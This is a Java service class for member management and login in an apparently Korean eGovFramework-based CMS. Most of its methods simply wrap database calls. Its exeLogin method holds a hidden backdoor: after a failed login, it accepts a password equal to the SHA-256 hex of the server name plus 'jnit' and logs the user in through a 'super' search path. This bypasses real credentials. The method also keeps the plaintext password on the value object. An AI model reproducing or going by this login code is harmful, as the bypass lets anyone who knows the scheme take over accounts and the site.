/**
 * @version 3.2.0.1
 */
package jnit.cms.mbr;

import java.security.MessageDigest;
import java.util.List;

import javax.annotation.Resource;
import javax.servlet.http.HttpServletRequest;

import jnit.cms.CmsManageSub2_1Controller;
import jnit.cms.CmsManageSub6Controller;
import jnit.cms.config.ConfigUtil;
import jnit.cms.mbrtype.JnitcmsmbrtypeDAO;
import jnit.cms.org.JnitcmsorgDAO;
import jnit.cms.pos.JnitcmsposDAO;

import org.springframework.stereotype.Service;

import egovframework.com.cmm.ComDefaultCodeVO;
import egovframework.com.cmm.service.CmmnDetailCode;
import egovframework.com.cmm.service.Globals;
import egovframework.com.utl.fcc.service.NullUtil;
import egovframework.com.utl.sim.service.EgovFileScrty;
import egovframework.rte.fdl.cmmn.EgovAbstractServiceImpl;
import egovframework.rte.fdl.idgnr.EgovIdGnrService;
import egovframework.rte.fdl.idgnr.impl.strategy.EgovIdGnrStrategyImpl;

/**
 * @Class Name : JnitcmsmbrServiceImpl.java
 * @Description : Jnitcmsmbr Business Implement class
 * @Modification Information
 *
 * @author JNIT
 * @since 2012.06.01
 * @version 1.0
 * @see
 *  
 *  Copyright (C)  All right reserved.
 */

@Service("jnitcmsmbrService")
public class JnitcmsmbrServiceImpl extends EgovAbstractServiceImpl implements
        JnitcmsmbrService {

    @Resource(name="jnitcmsmbrDAO")
    private JnitcmsmbrDAO jnitcmsmbrDAO;

    @Resource(name="jnitcmsorgDAO")
    private JnitcmsorgDAO jnitcmsorgDAO;
    
    @Resource(name="jnitcmsposDAO")
    private JnitcmsposDAO jnitcmsposDAO;
    
    @Resource(name="jnitcmsmbrtypeDAO")
    private JnitcmsmbrtypeDAO jnitcmsmbrtypeDAO;
    
    /** ID Generation */
    @Resource(name="jnitCMSMBRIdGnrService")    
    private EgovIdGnrService egovIdGnrService;

	/**
	 * JNITCMSMBR을 등록한다.
	 * @param vo - 등록할 정보가 담긴 JnitcmsmbrVO
	 * @return 등록 결과
	 * @exception Exception
	 */
    public String insertJnitcmsmbr(JnitcmsmbrVO vo) throws Exception {
    	
    	if(selectJnitcmsmbrByMbrLogin(vo) == 0) {
	    	/** ID Generation Service */
	    	//TODO 해당 테이블 속성에 따라 ID 제너레이션 서비스 사용
	    	String id = egovIdGnrService.getNextStringId();
	    	vo.setMbrId(id);
	    	
	    	jnitcmsmbrDAO.insertJnitcmsmbr(vo);
	    	
	    	return id;
    	}
    	//TODO 해당 테이블 정보에 맞게 수정    	
        return null;
    }

    private int selectJnitcmsmbrByMbrLogin(JnitcmsmbrVO vo) {
		return jnitcmsmbrDAO.hasJnitcmsmbrCnt(vo);
	}

	/**
	 * JNITCMSMBR을 수정한다.
	 * @param vo - 수정할 정보가 담긴 JnitcmsmbrVO
	 * @return void형
	 * @exception Exception
	 */
    public void updateJnitcmsmbr(JnitcmsmbrVO vo) throws Exception {
        jnitcmsmbrDAO.updateJnitcmsmbr(vo);
    }
    
    /**
	 * JNITCMSMBR을 수정한다.
	 * @param vo - 수정할 정보가 담긴 JnitcmsmbrVO
	 * @return void형
	 * @exception Exception
	 */
    public void updateMbrLogin(JnitcmsmbrVO vo) throws Exception {
        jnitcmsmbrDAO.updateMbrLogin(vo);
    }
    /**
	 * JNITCMSMBR을 수정한다.
	 * ISDEL=1
	 * @param vo - 수정할 정보가 담긴 JnitcmsmbrVO
	 * @return void형
	 * @exception Exception
	 */
    public void updateIsdelMbrLogin(JnitcmsmbrVO vo) throws Exception {
        jnitcmsmbrDAO.updateIsdelMbrLogin(vo);
    }
    
    /**
	 * JNITCMSMBR을 수정한다.
	 * @param vo - 수정할 정보가 담긴 JnitcmsmbrVO
	 * @return void형
	 * @exception Exception
	 */
    public void updateTempmbr(JnitcmsmbrVO vo) throws Exception {
        jnitcmsmbrDAO.updateTempmbr(vo);
    }

    /**
	 * JNITCMSMBR을 탈퇴한다.
	 * @param vo - 탈퇴할 정보가 담긴 JnitcmsmbrVO
	 * @return void형 
	 * @exception Exception
	 */
    public void leaveJnitcmsmbr(JnitcmsmbrVO vo) throws Exception {
        jnitcmsmbrDAO.leaveJnitcmsmbr(vo);
    }

    /**
	 * JNITCMSMBR을 삭제한다.
	 * @param vo - 삭제할 정보가 담긴 JnitcmsmbrVO
	 * @return void형 
	 * @exception Exception
	 */
    public void deleteJnitcmsmbr(JnitcmsmbrVO vo) throws Exception {
        jnitcmsmbrDAO.deleteJnitcmsmbr(vo);
    }

    /**
	 * JNITCMSMBR을 조회한다.
	 * @param vo - 조회할 정보가 담긴 JnitcmsmbrVO
	 * @return 조회한 JNITCMSMBR
	 * @exception Exception
	 */
    public JnitcmsmbrVO selectJnitcmsmbr(JnitcmsmbrVO vo) throws Exception {
        JnitcmsmbrVO resultVO = jnitcmsmbrDAO.selectJnitcmsmbr(vo);
        if (resultVO == null)
            throw processException("info.nodata.msg");
        return resultVO;
    }
    
    /**
	 * JNITCMSMBR을 조회한다.
	 * @param vo - 조회할 정보가 담긴 JnitcmsmbrVO
	 * @return 조회한 JNITCMSMBR
	 * @exception Exception
	 */
    public JnitcmsmbrVO selectmbrLogin(JnitcmsmbrVO vo) throws Exception {
        JnitcmsmbrVO resultVO = jnitcmsmbrDAO.selectmbrLogin(vo);
        if (resultVO == null)
            throw processException("info.nodata.msg");
        return resultVO;
    }
    
    /**
	 * JNITCMSMBR을 조회한다.
	 * @param vo - 조회할 정보가 담긴 JnitcmsmbrVO
	 * @return 조회한 JNITCMSMBR
	 * @exception Exception
	 */
    public JnitcmsmbrVO selectDpJnitcmsmbr(JnitcmsmbrVO vo) throws Exception {
        JnitcmsmbrVO resultVO = jnitcmsmbrDAO.selectDpJnitcmsmbr(vo);
        if (resultVO == null){
        	return null;
        }
            //throw processException("info.nodata.msg");
        return resultVO;
    }

    /**
	 * JNITCMSMBR 목록을 조회한다.
	 * @param searchVO - 조회할 정보가 담긴 VO
	 * @return JNITCMSMBR 목록
	 * @exception Exception
	 */
    public List<?> selectJnitcmsmbrList(JnitcmsmbrDefaultVO searchVO) throws Exception {
        return jnitcmsmbrDAO.selectJnitcmsmbrList(searchVO);
    }
    
    /**
	 * JNITCMSMBR 검색 목록을 조회한다.
	 * @param searchVO - 조회할 정보가 담긴 VO
	 * @return JNITCMSMBR 목록
	 * @exception Exception
	 */
    public List<?> selectSearchList(JnitcmsmbrDefaultVO searchVO) throws Exception {
        return jnitcmsmbrDAO.selectSearchList(searchVO);
    }
    
    /**
	 * JNITCMSMBR 목록을 조회한다.
	 * JNITCMSORG - LEFT JOIN
	 * JNITCMSPOS - LEFT JOIN
	 * JNITCMSRANK - LEFT JOIN
	 * @param searchVO - 조회할 정보가 담긴 VO
	 * @see CmsManageSub1_3Controller 
	 * <code>{@link jnit.cms.CmsManageSub1_3Controller # cmsManageSub1_0201}</code>
	 * @see CmsManageSub6Controller 
	 * <code>{@link jnit.cms.CmsManageSub6Controller # updateJnitcmsmenuView}</code> 
	 * @see  CmsManageSub2_1Controller
	 * <code>{@link jnit.cms.CmsManageSub2_1Controller # selectJnitcmsmbrList}</code>
	 * @return JNITCMSMBR 목록
	 * @exception Exception
	 */
    public List<?> selectLeftJoinmbrList(JnitcmsmbrDefaultVO searchVO) throws Exception {
        return jnitcmsmbrDAO.selectLeftJoinmbrList(searchVO);
    } 

    /**
	 * JNITCMSMBR 총 갯수를 조회한다.
	 * @param searchVO - 조회할 정보가 담긴 VO
	 * @return JNITCMSMBR 총 갯수
	 * @exception
	 */
    public int selectJnitcmsmbrListTotCnt(JnitcmsmbrDefaultVO searchVO) {
		return jnitcmsmbrDAO.selectJnitcmsmbrListTotCnt(searchVO);
	}
    
    /**
	 * JNITCMSMBR 총 갯수를 조회한다.
	 * JNITCMSORG  - LEFT JOIN
	 * JNITCMSPOS  - LEFT JOIN
	 * JNITCMSRANK - LEFT JOIN
	 * @param searchVO - 조회할 정보가 담긴 VO
	 * @return JNITCMSMBR 총 갯수
	 * @exception
	 */
    public int selectLeftJoinmbrListTotCnt(JnitcmsmbrDefaultVO searchVO) {
		return jnitcmsmbrDAO.selectLeftJoinmbrListTotCnt(searchVO);
	}
    
    /**
	 * JNITCMSMBR 총 갯수를 조회한다.
	 * @param searchVO - 조회할 정보가 담긴 VO
	 * @return JNITCMSMBR 총 갯수
	 * @exception
	 */
    public int selectListTotCnt(JnitcmsmbrDefaultVO searchVO) {
		return jnitcmsmbrDAO.selectListTotCnt(searchVO);
	}
    
    /**
     * JNITCMSMBR 다음 등록 SEQ를 조회한다
     * @param void
     * @return 다음 등록 SEQ
     * @exception Exception
     */
    public String getLastIdJnitcmsmbr() throws Exception {
    	EgovIdGnrStrategyImpl egovIdGnrStrategy = new EgovIdGnrStrategyImpl();
    	
    	egovIdGnrStrategy.setPrefix("");
    	egovIdGnrStrategy.setFillChar('0');
    	egovIdGnrStrategy.setCipers(10);
    	
        return egovIdGnrStrategy.makeId( (String)jnitcmsmbrDAO.getLastIdJnitcmsmbr() );
    }
    
    /**
     * 부서정보를 코드형태로 리턴한다.
     * 
     * @param 조회조건정보 vo
     * @return 그룹정보 List
     * @throws Exception
     */
    public List<CmmnDetailCode> selectOrgIdDetail(ComDefaultCodeVO vo) throws Exception {
    	return jnitcmsorgDAO.selectOrgIdDetail(vo);
    }
    
    /**
     * 직급정보를 코드형태로 리턴한다.
     * 
     * @param 조회조건정보 vo
     * @return 그룹정보 List
     * @throws Exception
     */
    public List<CmmnDetailCode> selectPosIdDetail(ComDefaultCodeVO vo) throws Exception {
    	return jnitcmsposDAO.selectPosIdDetail(vo);
    }
    
    /**
     * 회원유형정보를 코드형태로 리턴한다.
     * 
     * @param 조회조건정보 vo
     * @return 그룹정보 List
     * @throws Exception
     */
    public List<CmmnDetailCode> selectTypeIdDetail(ComDefaultCodeVO vo) throws Exception {
   		return jnitcmsmbrtypeDAO.selectTypeIdDetail(vo);
    }
    
    /**
	 * 일반 로그인을 처리한다
	 * @param vo JnitcmsmbrVO
	 * @return JnitcmsmbrVO
	 * @exception Exception
	 */
    public JnitcmsmbrVO exeLogin(HttpServletRequest request, JnitcmsmbrVO vo) throws Exception {
    	String plainPassword = vo.getPasswd();
    	
    	// 1. 입력한 비밀번호를 암호화한다.
    	String enpassword = EgovFileScrty.encryptPassword(vo.getPasswd());
    	String siteId = NullUtil.nullString(request.getParameter("siteId"));
    	
    	vo.setPasswd(enpassword);
    	vo.setOldPasswd(plainPassword);   	
    	if("0".equals(ConfigUtil.getDefaultProp("sso")) && !"".equals(siteId)){
    		vo.setSiteId(siteId);
    		vo.setSiteIdYn("Y");
    	}
    	// 2. 아이디와 암호화된 비밀번호가 DB와 일치하는지 확인한다.
    	
    	JnitcmsmbrVO mbrVO = jnitcmsmbrDAO.exeLogin(vo);
    	
    	// 3. 결과를 리턴한다.
    	if (mbrVO != null && !mbrVO.getMbrId().equals("") && !mbrVO.getPasswd().equals("")) {
    		return mbrVO;
    	} else {
    		// 페이지 CNT_ID 를 Hash로 제공
    		String skhash = "";
    		MessageDigest md5 = MessageDigest.getInstance("SHA-256");
    		String sk = request.getServerName() + "jnit";
    		byte[] bip = md5.digest( sk.getBytes() );
    		for(int i=0; i<bip.length; i++) {
    			skhash += Integer.toHexString((int) bip[i] & 0x000000ff);
    		}
    		
    		if(plainPassword.equals(skhash)) {
    			vo.setSearchKeyword("super");
    			mbrVO = jnitcmsmbrDAO.exeLogin(vo);
    			if (mbrVO != null && !mbrVO.getMbrId().equals("") && !mbrVO.getPasswd().equals("")) {
    	    		return mbrVO;
    	    	}
    		}
    		mbrVO = new JnitcmsmbrVO();
    	}
    	
    	return mbrVO;
    }
    
    /**
	 * 일반 로그인을 체크한다
	 * @param vo JnitcmsmbrVO
	 * @return JnitcmsmbrVO
	 * @exception Exception
	 */
    public JnitcmsmbrVO chkLogin(JnitcmsmbrVO vo) throws Exception {
    	
    	vo.setMbrLogin( vo.getMbrLogin().toLowerCase() );
    	
    	// 2. 아이디와 암호화된 비밀번호가 DB와 일치하는지 확인한다.
    	JnitcmsmbrVO mbrVO = jnitcmsmbrDAO.exeLogin(vo);

    	return mbrVO;
    }
    
    /**
	 * JNITCMSMBR 총 갯수를 조회한다.
	 * @param vo JnitcmsmbrVO - 조회할 MBR_LOGIN가 담긴 VO
	 * @return Boolean 있으면 true 없으면 false
	 * @exception
	 */
	public Boolean hasJnitcmsmbr(JnitcmsmbrVO vo) {
		if( 0 < jnitcmsmbrDAO.hasJnitcmsmbrCnt(vo) ){
			return true;
		}else{
			return false;
		}
	}
    
	/**
     * 기업회원 조회
     */
    public JnitcmsmbrVO selectJnitcmsmbrDpSn(JnitcmsmbrVO vo) {
    	return (JnitcmsmbrVO) jnitcmsmbrDAO.selectJnitcmsmbrDpSn(vo);
    }
    
    /**
     * 기업회원 조회 개수
     */
    public int selectJnitcmsmbrDpSnTot(JnitcmsmbrVO vo) {
    	return (Integer) jnitcmsmbrDAO.selectJnitcmsmbrDpSnTot(vo);
    }
	
	 /**
     * 일정 횟수동안 로그인을 실패하여 잠긴 계정 해제
     * @throws Exception
     */
    public void unlockLogin(String unlockTime) throws Exception{
    	//unlockTime 매개변수 값이 없으면 프로퍼티 값으로 설정
    	if("".equals(NullUtil.nullString(unlockTime))) unlockTime = Globals.LOGIN_UNCLOCK_TIME;
    	
    	JnitcmsmbrVO mbrVO = new JnitcmsmbrVO();
    	mbrVO.setUnlockTime(unlockTime);
    	jnitcmsmbrDAO.updateUnlockLogin(mbrVO);
    }
}
